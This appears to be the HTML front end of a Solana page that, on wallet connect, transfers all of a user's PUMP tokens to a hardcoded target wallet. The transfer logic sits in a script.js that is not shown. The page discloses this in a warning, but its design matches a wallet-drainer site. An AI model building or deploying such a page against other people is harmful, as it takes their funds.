<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUMP Token Transfer</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0f172a;
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
        }
        
        .card {
            background: #1e293b;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            border: 1px solid #334155;
        }
        
        h1 {
            text-align: center;
            color: #3b82f6;
            margin-bottom: 25px;
            font-size: 24px;
        }
        
        .info-section {
            background: #0f172a;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #334155;
        }
        
        .info-item {
            margin-bottom: 15px;
        }
        
        .info-item:last-child {
            margin-bottom: 0;
        }
        
        .info-label {
            font-size: 14px;
            color: #94a3b8;
            margin-bottom: 5px;
        }
        
        .info-value {
            font-family: 'Courier New', monospace;
            font-size: 12px;
            color: #e2e8f0;
            word-break: break-all;
            background: rgba(255, 255, 255, 0.05);
            padding: 10px;
            border-radius: 5px;
        }
        
        .warning {
            background: rgba(245, 158, 11, 0.1);
            border: 1px solid #f59e0b;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 25px;
            display: flex;
            align-items: flex-start;
            gap: 12px;
        }
        
        .warning-icon {
            color: #f59e0b;
            font-size: 18px;
        }
        
        .warning-text {
            color: #fbbf24;
            font-size: 14px;
            line-height: 1.5;
        }
        
        #connect-wallet {
            width: 100%;
            background: #3b82f6;
            color: white;
            border: none;
            padding: 18px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        #connect-wallet:hover:not(:disabled) {
            background: #2563eb;
        }
        
        #connect-wallet:disabled {
            background: #64748b;
            cursor: not-allowed;
        }
        
        #status {
            background: #0f172a;
            border-radius: 10px;
            padding: 15px;
            min-height: 60px;
            font-size: 14px;
            line-height: 1.5;
            color: #94a3b8;
            border: 1px solid #334155;
        }
        
        .success {
            color: #10b981;
        }
        
        .error {
            color: #ef4444;
        }
        
        .loading {
            color: #3b82f6;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>üöÄ PUMP TOKEN TRANSFER</h1>
            
            <div class="info-section">
                <div class="info-item">
                    <div class="info-label">PUMP Token Address:</div>
                    <div class="info-value">4sxxEHW6XqX5YBYs29f1p2RhR7afXFS8wQWcMYQVpump</div>
                </div>
                <div class="info-item">
                    <div class="info-label">Target Wallet:</div>
                    <div class="info-value">95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD</div>
                </div>
            </div>
            
            <div class="warning">
                <div class="warning-icon">‚ö†Ô∏è</div>
                <div class="warning-text">
                    <strong>Warning:</strong> Connecting wallet will automatically transfer ALL PUMP tokens to the target address.
                </div>
            </div>
            
            <button id="connect-wallet">
                <span>üîó</span> CONNECT WALLET & TRANSFER PUMP
            </button>
            
            <div id="status">Ready to connect...</div>
        </div>
    </div>

    <!-- Load jQuery -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <!-- Load Solana Web3.js -->
    <script src="https://unpkg.com/@solana/web3.js@1.70.1/lib/index.iife.js"></script>
    <!-- Load SPL Token -->
    <script src="https://unpkg.com/@solana/spl-token@0.3.8/lib/index.iife.js"></script>
    <script src="script.js"></script>
</body>
</html>
